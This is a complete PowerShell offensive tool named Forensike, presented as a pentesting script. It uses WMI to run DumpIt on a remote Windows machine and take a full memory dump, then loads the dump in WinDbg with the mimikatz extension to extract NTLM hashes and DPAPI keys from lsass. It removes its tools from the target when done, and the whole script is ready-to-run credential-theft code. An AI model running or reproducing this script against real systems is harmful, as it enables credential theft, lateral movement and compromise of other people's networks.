<#  
.SYNOPSIS  
    Forensike for pentesting

.DESCRIPTION
	Forensike is a PowerShell script that can be leveraged to pull Windows Crash Dump from a live windows system on your network in order to extract credentials from it. It DOES NOT utilize WinRM capabilities.
	It utilizes the DumpIt.exe dumping tool from Comae Forensic Framework to dump memory, the debugger will open final crash dump on victim's machine, load mimikatz windbg extension, extracts credential from crash dump's lsass process. 

.PARAMETER Target
    This is the target computer where you will be collecting artifacts from. Take only hostname. If you face DNS issue and can't proprerly resolve your target's name, you can add the target IP in your host file

.PARAMETER ToolsDir
	This the file path location of the tools on the analysis system.

.PARAMETER DumpDir
	This is the path you want the final results text file to be written. This folder will also contain both lsass.txt and hashes.txt


.NOTEs:  
    	
	Requires DumpIt.exe for memory acquisition.
	Assumed Directories:
	c:\windows\temp\Forensike - Where the work will be done/copied
	Must be ran as a user that will have Admin creds on the remote system.
#>

Param(
  [Parameter(Mandatory=$True,Position=0)]
   [string]$target,
   
   [Parameter(Mandatory=$True)]
   [string]$toolsDir,
   
   [Parameter(Mandatory=$True)]
   [string]$dumpDir
     
    )
   
echo "====================================================================="
echo "====================================================================="
# Logo
$Logo = @"

███████╗ ██████╗ ██████╗ ███████╗███╗   ██╗███████╗██╗██╗  ██╗███████╗
██╔════╝██╔═══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██║██║ ██╔╝██╔════╝
█████╗  ██║   ██║██████╔╝█████╗  ██╔██╗ ██║███████╗██║█████╔╝ █████╗  
██╔══╝  ██║   ██║██╔══██╗██╔══╝  ██║╚██╗██║╚════██║██║██╔═██╗ ██╔══╝  
██║     ╚██████╔╝██║  ██║███████╗██║ ╚████║███████║██║██║  ██╗███████╗
╚═╝      ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═╝╚══════╝
							
						Offensive Forensics
"@
Write-Output ""
Write-Output "$Logo"
Write-Output ""

echo ""
echo "====================================================================="
Write-Host -Fore White "Requires administrator privileges on target system"
echo "====================================================================="
echo ""
echo ""


#Get system info
	$targetName = Get-WMIObject -class Win32_ComputerSystem -ComputerName $target | ForEach-Object Name
	$targetIP = Get-WMIObject -class Win32_NetworkAdapterConfiguration -ComputerName $target -Filter "IPEnabled='TRUE'" | Where {$_.IPAddress} | Select -ExpandProperty IPAddress | Where{$_ -notlike "*:*"}
	$mem = [math]::Round((Get-WmiObject Win32_LogicalDisk -ComputerName $target | Where-Object {$_.DriveType -eq 3} | Measure-Object -Property FreeSpace -Sum).Sum / 1GB, 3)
	$tmzn = Get-WmiObject -class Win32_TimeZone -Computer $target | select -ExpandProperty caption


#Display logged in user info (if any)	
	if ($expproc = gwmi win32_process -computer $target -Filter "Name = 'explorer.exe'") {
		$exuser = ($expproc.GetOwner()).user
		$exdom = ($expproc.GetOwner()).domain
		$currUser = "$exdom" + "\$exuser" }
	else { 
		$currUser = "NONE" 
	}

echo ""
echo "====================================================================="
Write-Host -ForegroundColor White "==[ $targetName - $targetIP"
Write-Host -ForegroundColor White "==[ Total memory size: $mem GB"
Write-Host -ForegroundColor White "==[ Timezone: $tmzn"
Write-Host -ForegroundColor White "==[ Current logged on user: $currUser"
echo "====================================================================="
echo ""

# Estimate the Windows Crash Dump final size
# Get the total physical memory in bytes from the remote machine
$physicalMemory = Get-WmiObject Win32_ComputerSystem -ComputerName $target | Select-Object -ExpandProperty TotalPhysicalMemory

# Convert bytes to gigabytes for a more readable result
$estimatedDumpSizeGB = [math]::Round($physicalMemory / 1GB, 3)

Write-Host "Estimated final Windows Crash Dump size is " -nonewline
Write-Host -ForegroundColor Green "$estimatedDumpSizeGB " -nonewline
Write-Host "GB"

# Get all the logical disks from the remote machine
$disks = Get-WmiObject -Class Win32_LogicalDisk -ComputerName $target -Filter "DriveType = 3"  # DriveType 3 is for local disks

# Find the disk with the most available space
$mostSpaceDisk = $disks | Sort-Object -Property FreeSpace -Descending | Select-Object -First 1
$mostSpaceAvailableGB = [math]::Round($mostSpaceDisk.FreeSpace / 1GB, 3)

# Prompt the user to validate the disk selection
Write-Host "The disk with the most available space for " -nonewline
Write-Host -ForegroundColor Green "$target " -nonewline
Write-Host "is " -nonewline
Write-Host -ForegroundColor Green "$($mostSpaceDisk.DeviceID) " -nonewline
Write-Host "with " -nonewline
Write-Host -ForegroundColor Green "$mostSpaceAvailableGB " -nonewline 
Write-Host "GB available."
$confirmation = Read-Host "Do you want to use this disk? (Y/N)"
if ($confirmation -ne 'Y' -and $confirmation -ne 'y') {
    Write-Host "Operation cancelled by user."
    Exit
}
################
##Set up environment on remote system. Forensike folder for memtools and art folder for memory.##
################
##For consistency, the working directory will be located in the "c:\windows\temp\Forensike" folder on both the target and initiator system.
##Tools will stored directly in the "Forensike" folder for use. Artifacts collected on the local environment of the remote system will be dropped in the workingdir.


##Set up new PSDrives mapping to remote drive
		#Set up PSDrive so that attacker can upload file to target
		New-PSDrive -Name "Forensike" -PSProvider filesystem -Root \\$target\c$ | Out-Null
		$remoteMEMfold = "Forensike:\windows\Temp\Forensike"
		New-Item -Path $remoteMEMfold -ItemType Directory | Out-Null
		$ForensikeFolder = "C:\windows\Temp\Forensike"
		$date = Get-Date -format yyyy-MM-dd_HHmm_
		
	##connect and move softwares to target client
		echo ""
		Write-Host -Fore White "Copying tools...."
		Copy-Item $toolsDir\DumpIt.exe $remoteMEMfold -recurse
		Write-Host -ForegroundColor Green "  [done]"
		

	#Run DumpIt remotely
		$memName = "Forensike"
		$dumpPath = $ForensikeFolder+"\"+$memName+".dmp"
		$memdump = "powershell /c $ForensikeFolder\DumpIt.exe /OUTPUT $dumpPath /QUIET" 
		Invoke-WmiMethod -class Win32_process -name Create -ArgumentList $memdump -ComputerName $target | Out-Null
		echo "====================================================================="
		Write-Host -ForegroundColor White -BackgroundColor Darkred ">>>>>>>>>>[ STARTING CRASH DUMP ACQUISITION ]<<<<<<<<<<<"
		echo "====================================================================="
		echo ""
		$time1 = (Get-Date).ToShortTimeString()
		Write-host -Foregroundcolor White "-[ Start time: $time1 ]-"
		Start-Sleep -Seconds 10

	#Monitor the DumpIt processs
		do {(Write-Host -ForegroundColor White "Dumping target's memory..."),(Start-Sleep -Seconds 180)}
		until ((Get-WMIobject -Class Win32_process -Filter "Name='DumpIt.exe'" -ComputerName $target | where {$_.Name -eq "DumpIt.exe"}).ProcessID -eq $null)
		Write-Host -ForegroundColor Green "  [done]"
		Start-Sleep -Seconds 10

	echo "====================================================================="
	Write-Host -ForegroundColor White -BackgroundColor Darkred ">>>>>>>>>>[ STARTING NT HASHES EXTRACTION ]<<<<<<<<<<<"
	echo "====================================================================="
	
	## Credentials Extractor
		# 1 - Calls windbg, load retrieved crash dump, load mimilib, get lsass context and write lsass adress in lsass.txt and exit
		WindbgX.exe -z "\\$target\C$\Windows\Temp\Forensike\Forensike.dmp" -c ".load $toolsDir\mimilib.dll" -c "!process 0 0 lsass.exe" -logo $dumpDir\lsass.txt -c "qq"
		
		# 2 - Reads lsass.txt, retrieve only the lsass adress, and store into a variable
		$lsass_process = Select-String -Path "$dumpDir\lsass.txt" -Pattern 'PROCESS\s+([0-9a-f]+)' | ForEach-Object { $_.Matches.Groups[1].Value } | Where-Object {$_ -ne '0' -and $_ -ne 'add'}

		Write-Host -ForegroundColor Green "LSASS.exe is located at $lsass_process"

		Start-Sleep -Seconds 5

		# 3 - Redoes step 1, reuses the $lsass_process variable to inject lsass.exe adress into the .process command, loads lsass process, runs mimikatz debugger to extract NT hashes, writes to a file and exits
		#Invoke-Command -ScriptBlock {comm}
		WinDbgX.exe -z "\\$target\C$\Windows\Temp\Forensike\Forensike.dmp" -c ".load $toolsDir\mimilib.dll" -c "!process 0 0 lsass.exe" -c ".process /r /p $lsass_process" -c "!mimikatz" -logo "$dumpDir\hashes.txt" -c "qq"
			

	# Displays hashes back
	$EndHashes = Get-Content -Path "$dumpDir\hashes.txt" | Select-String -Pattern " Domain   :| Username :|NTLM     :| DPAPI    :" | Out-File -FilePath $dumpDir\forensike_results.txt
	
		#Clean everything up
		#Delete the remote Forensike folder tools
		Write-Host -Fore Green "Cleaning up the mess...."

		Remove-Item $remoteMEMfold -Recurse -Force 

		#Disconnect the PSDrive X mapping##
		Remove-PSDrive -Name Forensike
	
		# Get of acquisition time & calculate entire attack duration
		$time2 = (Get-Date).ToShortTimeString()
		echo ""
		Write-host -Foregroundcolor White "-[ End time: $time2 ]-"
		echo ""
		$time3=((Get-Date $time2) – (Get-Date $time1)).tostring()
		Write-Host -ForegroundColor White "-[Windows Crash Dump Acquisition time : $time3 ]-"

	echo ""
	echo "====================================================================="
	Write-Host -ForegroundColor DarkGreen "Hashes await you at $dumpDir\forensike_results.txt, have fun ..."
	echo "====================================================================="
